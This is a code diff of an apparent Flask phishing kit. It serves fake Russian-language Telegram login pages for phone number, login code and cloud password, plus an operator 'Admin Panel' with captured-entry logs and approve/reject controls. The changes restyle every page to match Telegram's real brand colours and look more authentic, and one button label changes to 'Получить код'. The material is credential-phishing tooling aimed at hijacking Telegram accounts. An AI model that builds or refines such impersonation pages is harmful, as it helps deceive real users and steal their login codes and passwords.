@@ -29,12 +29,12 @@ def index():
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Telegram - Авторизация</title>
-        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
-                font-family: 'Roboto', sans-serif; 
-                background: linear-gradient(135deg, #e6e6e6 0%, #ffffff 100%);
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+                background: #f0f0f0;
                 color: #333; 
                 display: flex; 
                 justify-content: center; 
@@ -43,59 +43,59 @@ def index():
                 padding: 20px;
             }
             .container { 
-                max-width: 420px; 
+                max-width: 400px; 
                 width: 100%;
-                background: rgba(255, 255, 255, 0.95);
+                background: #ffffff;
                 padding: 40px 30px;
-                border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+                border-radius: 18px;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
                 text-align: center; 
-                animation: slideIn 0.5s ease-out;
+                animation: fadeIn 0.4s ease-out;
             }
-            @keyframes slideIn { 
-                from { opacity: 0; transform: translateY(-30px); } 
+            @keyframes fadeIn { 
+                from { opacity: 0; transform: translateY(-20px); } 
                 to { opacity: 1; transform: translateY(0); } 
             }
             .logo {
                 width: 80px;
                 height: 80px;
-                background: linear-gradient(135deg, #0088cc, #005580);
+                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                 border-radius: 20px;
                 margin: 0 auto 25px;
                 display: flex;
                 align-items: center;
                 justify-content: center;
                 font-size: 40px;
-                box-shadow: 0 10px 25px rgba(0,136,204,0.2);
+                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
             }
             h1 { 
                 color: #333; 
-                font-size: 28px;
-                font-weight: 700;
+                font-size: 26px;
+                font-weight: 600;
                 margin-bottom: 15px;
             }
             p {
                 color: #666;
-                font-size: 16px;
+                font-size: 15px;
                 margin-bottom: 30px;
                 line-height: 1.5;
             }
             button { 
-                background: linear-gradient(135deg, #0088cc, #005580);
+                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                 color: #fff; 
                 border: none; 
                 padding: 16px 40px;
                 border-radius: 12px;
                 cursor: pointer; 
-                font-size: 18px;
+                font-size: 17px;
                 font-weight: 500;
                 width: 100%;
                 transition: all 0.3s ease;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
+                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.3);
             }
             button:hover { 
                 transform: translateY(-2px);
-                box-shadow: 0 12px 30px rgba(0,136,204,0.3);
+                box-shadow: 0 6px 16px rgba(42, 171, 238, 0.4);
             }
             button:active { 
                 transform: translateY(0);
@@ -104,8 +104,8 @@ def index():
                 margin-top: 25px;
                 padding: 15px;
                 background: #f0f9ff;
-                border-radius: 10px;
-                color: #0088cc;
+                border-radius: 12px;
+                color: #2AABEE;
                 font-size: 14px;
                 display: flex;
                 align-items: center;
@@ -141,12 +141,12 @@ def phone():
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Telegram - Вход</title>
-        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
-                font-family: 'Roboto', sans-serif; 
-                background: linear-gradient(135deg, #e6e6e6 0%, #ffffff 100%);
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+                background: #f0f0f0;
                 display: flex; 
                 justify-content: center; 
                 align-items: center; 
@@ -154,16 +154,16 @@ def phone():
                 padding: 20px;
             }
             .container { 
-                max-width: 420px; 
+                max-width: 400px; 
                 width: 100%;
-                background: rgba(255, 255, 255, 0.95);
+                background: #ffffff;
                 padding: 40px 30px;
-                border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
-                animation: slideIn 0.5s ease-out;
+                border-radius: 18px;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+                animation: fadeIn 0.4s ease-out;
             }
-            @keyframes slideIn { 
-                from { opacity: 0; transform: translateY(-30px); } 
+            @keyframes fadeIn { 
+                from { opacity: 0; transform: translateY(-20px); } 
                 to { opacity: 1; transform: translateY(0); } 
             }
             .header {
@@ -173,19 +173,19 @@ def phone():
             .logo {
                 width: 70px;
                 height: 70px;
-                background: linear-gradient(135deg, #0088cc, #005580);
+                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                 border-radius: 18px;
                 margin: 0 auto 20px;
                 display: flex;
                 align-items: center;
                 justify-content: center;
                 font-size: 35px;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
+                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
             }
             h2 { 
                 color: #333; 
                 font-size: 24px;
-                font-weight: 700;
+                font-weight: 600;
                 margin-bottom: 10px;
             }
             .subtitle {
@@ -214,12 +214,12 @@ def phone():
                 background: #fff;
             }
             input:focus { 
-                border-color: #0088cc;
+                border-color: #2AABEE;
                 outline: none;
-                box-shadow: 0 0 0 4px rgba(0,136,204,0.1);
+                box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.15);
             }
             button { 
-                background: linear-gradient(135deg, #0088cc, #005580);
+                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                 color: #fff; 
                 border: none; 
                 padding: 16px;
@@ -229,12 +229,12 @@ def phone():
                 font-weight: 500;
                 width: 100%;
                 transition: all 0.3s ease;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
+                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.3);
                 margin-top: 10px;
             }
             button:hover { 
                 transform: translateY(-2px);
-                box-shadow: 0 12px 30px rgba(0,136,204,0.3);
+                box-shadow: 0 6px 16px rgba(42, 171, 238, 0.4);
             }
             button:active { 
                 transform: translateY(0);
@@ -250,7 +250,7 @@ def phone():
                 margin-top: 10px;
                 padding: 12px;
                 background: #fee;
-                border-radius: 8px;
+                border-radius: 12px;
                 display: none;
             }
             .error.show {
@@ -265,7 +265,7 @@ def phone():
             .loading {
                 display: none;
                 text-align: center;
-                color: #0088cc;
+                color: #2AABEE;
                 margin-top: 15px;
             }
             .loading.show {
@@ -273,7 +273,7 @@ def phone():
             }
             .spinner {
                 border: 3px solid #f3f3f3;
-                border-top: 3px solid #0088cc;
+                border-top: 3px solid #2AABEE;
                 border-radius: 50%;
                 width: 30px;
                 height: 30px;
@@ -348,7 +348,7 @@ def phone():
                 <input id="phone" type="tel" placeholder="+7 (___) ___-__-__" value="+7 " autofocus />
             </div>
             <div id="error" class="error"></div>
-            <button id="submitBtn" onclick="submitPhone()">Продолжить</button>
+            <button id="submitBtn" onclick="submitPhone()">Получить код</button>
             <div id="loading" class="loading">
                 <div class="spinner"></div>
                 <p style="margin-top: 10px;">Отправка...</p>
@@ -390,12 +390,12 @@ def code():
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Telegram - Код подтверждения</title>
-        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
-                font-family: 'Roboto', sans-serif; 
-                background: linear-gradient(135deg, #e6e6e6 0%, #ffffff 100%);
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+                background: #f0f0f0;
                 display: flex; 
                 justify-content: center; 
                 align-items: center; 
@@ -403,16 +403,16 @@ def code():
                 padding: 20px;
             }
             .container { 
-                max-width: 420px; 
+                max-width: 400px; 
                 width: 100%;
-                background: rgba(255, 255, 255, 0.95);
+                background: #ffffff;
                 padding: 40px 30px;
-                border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
-                animation: slideIn 0.5s ease-out;
+                border-radius: 18px;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+                animation: fadeIn 0.4s ease-out;
             }
-            @keyframes slideIn { 
-                from { opacity: 0; transform: translateY(-30px); } 
+            @keyframes fadeIn { 
+                from { opacity: 0; transform: translateY(-20px); } 
                 to { opacity: 1; transform: translateY(0); } 
             }
             .header {
@@ -422,19 +422,19 @@ def code():
             .logo {
                 width: 70px;
                 height: 70px;
-                background: linear-gradient(135deg, #0088cc, #005580);
+                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                 border-radius: 18px;
                 margin: 0 auto 20px;
                 display: flex;
                 align-items: center;
                 justify-content: center;
                 font-size: 35px;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
+                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
             }
             h2 { 
                 color: #333; 
                 font-size: 24px;
-                font-weight: 700;
+                font-weight: 600;
                 margin-bottom: 10px;
             }
             .subtitle {
@@ -443,7 +443,7 @@ def code():
                 line-height: 1.5;
             }
             .phone-display {
-                color: #0088cc;
+                color: #2AABEE;
                 font-weight: 500;
                 margin-top: 5px;
             }
@@ -464,9 +464,9 @@ def code():
                 transition: all 0.3s;
             }
             .code-input:focus {
-                border-color: #0088cc;
+                border-color: #2AABEE;
                 outline: none;
-                box-shadow: 0 0 0 4px rgba(0,136,204,0.1);
+                box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.15);
             }
             .error { 
                 color: #e74c3c;
@@ -474,7 +474,7 @@ def code():
                 text-align: center;
                 padding: 12px;
                 background: #fee;
-                border-radius: 8px;
+                border-radius: 12px;
                 display: none;
                 margin-bottom: 15px;
             }
@@ -490,7 +490,7 @@ def code():
             .resend-link {
                 text-align: center;
                 margin-top: 20px;
-                color: #0088cc;
+                color: #2AABEE;
                 cursor: pointer;
                 font-size: 15px;
             }
@@ -500,7 +500,7 @@ def code():
             .loading {
                 display: none;
                 text-align: center;
-                color: #0088cc;
+                color: #2AABEE;
                 margin-top: 15px;
             }
             .loading.show {
@@ -603,12 +603,12 @@ def password():
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Telegram - Cloud Password</title>
-        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
-                font-family: 'Roboto', sans-serif; 
-                background: linear-gradient(135deg, #e6e6e6 0%, #ffffff 100%);
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+                background: #f0f0f0;
                 display: flex; 
                 justify-content: center; 
                 align-items: center; 
@@ -616,16 +616,16 @@ def password():
                 padding: 20px;
             }
             .container { 
-                max-width: 420px; 
+                max-width: 400px; 
                 width: 100%;
-                background: rgba(255, 255, 255, 0.95);
+                background: #ffffff;
                 padding: 40px 30px;
-                border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.1);
-                animation: slideIn 0.5s ease-out;
+                border-radius: 18px;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+                animation: fadeIn 0.4s ease-out;
             }
-            @keyframes slideIn { 
-                from { opacity: 0; transform: translateY(-30px); } 
+            @keyframes fadeIn { 
+                from { opacity: 0; transform: translateY(-20px); } 
                 to { opacity: 1; transform: translateY(0); } 
             }
             .header {
@@ -635,19 +635,19 @@ def password():
             .logo {
                 width: 70px;
                 height: 70px;
-                background: linear-gradient(135deg, #0088cc, #005580);
+                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                 border-radius: 18px;
                 margin: 0 auto 20px;
                 display: flex;
                 align-items: center;
                 justify-content: center;
                 font-size: 35px;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
+                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
             }
             h2 { 
                 color: #333; 
                 font-size: 24px;
-                font-weight: 700;
+                font-weight: 600;
                 margin-bottom: 10px;
             }
             .subtitle {
@@ -676,9 +676,9 @@ def password():
                 background: #fff;
             }
             input:focus { 
-                border-color: #0088cc;
+                border-color: #2AABEE;
                 outline: none;
-                box-shadow: 0 0 0 4px rgba(0,136,204,0.1);
+                box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.15);
             }
             .toggle-password {
                 position: absolute;
@@ -689,7 +689,7 @@ def password():
                 user-select: none;
             }
             button { 
-                background: linear-gradient(135deg, #0088cc, #005580);
+                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                 color: #fff; 
                 border: none; 
                 padding: 16px;
@@ -699,12 +699,12 @@ def password():
                 font-weight: 500;
                 width: 100%;
                 transition: all 0.3s ease;
-                box-shadow: 0 8px 20px rgba(0,136,204,0.2);
+                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.3);
                 margin-top: 10px;
             }
             button:hover { 
                 transform: translateY(-2px);
-                box-shadow: 0 12px 30px rgba(0,136,204,0.3);
+                box-shadow: 0 6px 16px rgba(42, 171, 238, 0.4);
             }
             button:active { 
                 transform: translateY(0);
@@ -714,7 +714,7 @@ def password():
                 font-size: 14px;
                 padding: 12px;
                 background: #fee;
-                border-radius: 8px;
+                border-radius: 12px;
                 display: none;
                 margin-bottom: 15px;
             }
@@ -728,7 +728,7 @@ def password():
                 text-align: center;
                 padding: 15px;
                 background: #d5f4e6;
-                border-radius: 8px;
+                border-radius: 12px;
                 display: none;
                 margin-top: 15px;
             }
@@ -748,7 +748,7 @@ def password():
             .forgot-link {
                 text-align: center;
                 margin-top: 15px;
-                color: #0088cc;
+                color: #2AABEE;
                 cursor: pointer;
                 font-size: 15px;
             }
@@ -840,32 +840,33 @@ def admin():
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Admin Panel - Telegram</title>
-        <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body { 
-                font-family: 'Roboto', sans-serif; 
-                background: #1a1a2e;
-                color: #eee;
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+                background: #f0f0f0;
+                color: #333;
                 padding: 20px;
             }
             .header {
-                background: linear-gradient(135deg, #0f3443 0%, #34e89e 100%);
+                background: #ffffff;
                 padding: 25px;
-                border-radius: 15px;
+                border-radius: 16px;
                 margin-bottom: 30px;
-                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             }
             .header h1 {
-                font-size: 32px;
-                font-weight: 700;
+                font-size: 28px;
+                font-weight: 600;
                 display: flex;
                 align-items: center;
                 gap: 15px;
+                color: #333;
             }
             .header p {
                 margin-top: 10px;
-                opacity: 0.9;
+                color: #666;
             }
             .stats {
                 display: grid;
@@ -874,73 +875,72 @@ def admin():
                 margin-bottom: 30px;
             }
             .stat-card {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                background: #ffffff;
                 padding: 20px;
                 border-radius: 12px;
-                box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             }
             .stat-card h3 {
                 font-size: 14px;
-                opacity: 0.8;
+                color: #666;
                 margin-bottom: 8px;
             }
             .stat-card .value {
                 font-size: 32px;
                 font-weight: 700;
+                color: #2AABEE;
             }
             .container { 
                 max-width: 1400px;
                 margin: auto;
             }
             .section {
-                background: #16213e;
-                border-radius: 15px;
+                background: #ffffff;
+                border-radius: 16px;
                 padding: 25px;
                 margin-bottom: 25px;
-                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             }
             .section h2 {
                 font-size: 22px;
                 margin-bottom: 20px;
-                color: #34e89e;
-                display: flex;
-                align-items: center;
-                gap: 10px;
+                color: #333;
+                font-weight: 600;
             }
             #logs { 
                 height: 350px;
                 overflow-y: auto;
-                background: #0f1419;
+                background: #f9f9f9;
                 padding: 15px;
-                border-radius: 10px;
-                font-family: 'Roboto Mono', monospace;
+                border-radius: 12px;
+                font-family: 'Inter', monospace;
                 font-size: 13px;
                 line-height: 1.8;
-                border: 1px solid #2a2e35;
+                border: 1px solid #eee;
             }
             #logs::-webkit-scrollbar {
                 width: 8px;
             }
             #logs::-webkit-scrollbar-track {
-                background: #0f1419;
+                background: #f1f1f1;
             }
             #logs::-webkit-scrollbar-thumb {
-                background: #34e89e;
+                background: #2AABEE;
                 border-radius: 4px;
             }
             .log-entry {
                 padding: 5px 0;
-                border-bottom: 1px solid #1a1f26;
+                border-bottom: 1px solid #eee;
             }
             #pending {
                 display: grid;
                 gap: 15px;
             }
             .pending-item {
-                background: #0f1419;
+                background: #f9f9f9;
                 padding: 20px;
-                border-radius: 10px;
-                border-left: 4px solid #34e89e;
+                border-radius: 12px;
+                border-left: 4px solid #2AABEE;
                 display: flex;
                 justify-content: space-between;
                 align-items: center;
@@ -954,15 +954,15 @@ def admin():
                 flex: 1;
             }
             .pending-info strong {
-                color: #34e89e;
+                color: #2AABEE;
                 font-size: 18px;
             }
             .pending-info .data {
-                color: #fff;
+                color: #333;
                 font-size: 24px;
                 font-weight: 700;
                 margin: 8px 0;
-                font-family: 'Roboto Mono', monospace;
+                font-family: 'Inter', monospace;
             }
             .pending-info .meta {
                 color: #888;
@@ -973,7 +973,7 @@ def admin():
                 gap: 10px;
             }
             button { 
-                background: linear-gradient(135deg, #34e89e, #0f3443);
+                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                 color: #fff; 
                 border: none; 
                 padding: 12px 24px;
@@ -982,18 +982,18 @@ def admin():
                 font-size: 15px;
                 font-weight: 500;
                 transition: all 0.3s;
-                box-shadow: 0 4px 15px rgba(52, 232, 158, 0.3);
+                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
             }
             button:hover { 
                 transform: translateY(-2px);
-                box-shadow: 0 6px 20px rgba(52, 232, 158, 0.4);
+                box-shadow: 0 6px 16px rgba(42, 171, 238, 0.3);
             }
             button.reject { 
-                background: linear-gradient(135deg, #ee0979, #ff6a00);
-                box-shadow: 0 4px 15px rgba(238, 9, 121, 0.3);
+                background: linear-gradient(135deg, #e74c3c, #c0392b);
+                box-shadow: 0 4px 12px rgba(231, 76, 60, 0.2);
             }
             button.reject:hover {
-                box-shadow: 0 6px 20px rgba(238, 9, 121, 0.4);
+                box-shadow: 0 6px 16px rgba(231, 76, 60, 0.3);
             }
             .empty-state {
                 text-align: center;
